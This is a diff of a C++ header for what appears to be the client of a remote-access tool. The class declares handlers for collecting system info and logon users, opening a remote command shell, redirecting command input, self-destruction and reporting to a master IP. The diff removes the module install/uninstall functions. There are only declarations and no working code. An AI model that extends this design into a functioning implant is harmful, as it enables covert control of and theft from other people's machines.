@@ -1,8 +1,8 @@
 #pragma once
 #include "CommData.h"
 #include "CommNames.h"
-#include "ModuleManager.h"
 #include "CmdRedirector.h"
+#include "../../pub/ModuleInterface.h"
 
 class Manager
 {
@@ -10,8 +10,6 @@ class Manager
 public:
 	ULONG GetMasterIP();
 	GUID GetClientID() const;
-	BOOL LoadModule(LPCTSTR modFilename);
-	BOOL LoadModule(ByteBuffer& content, LPCTSTR modFilename );
 	BOOL DeleteModule(LPCTSTR modFilename);
 //	void AddAllLocalModules();
 
@@ -31,9 +29,7 @@ private:
 	static BOOL ExecuteRCCommand_SetDefaultCommName(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
 	static BOOL ExecuteRCCommand_CollectInfo(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
 	static BOOL ExecuteRCCommand_CollectLogonUsers(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
-	static BOOL ExecuteRCCommand_InstallMod(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
 	static BOOL ExecuteRCCommand_SelfDestruction(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
-	static BOOL ExecuteRCCommand_UnInstallMod(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
 
 	static BOOL ExecuteRCCommand_OpenCmd(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
 	static BOOL ExecuteRCCommand_CmdInput(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
@@ -55,7 +51,6 @@ private:
 public:
 	CmdRedirector	m_cmdRedirector;
 private:
-	ModuleManager	m_moduleMgr;
 	COMM_NAME		m_commName;
 	ULONG			m_masterIP;
 	GUID			m_clientid;
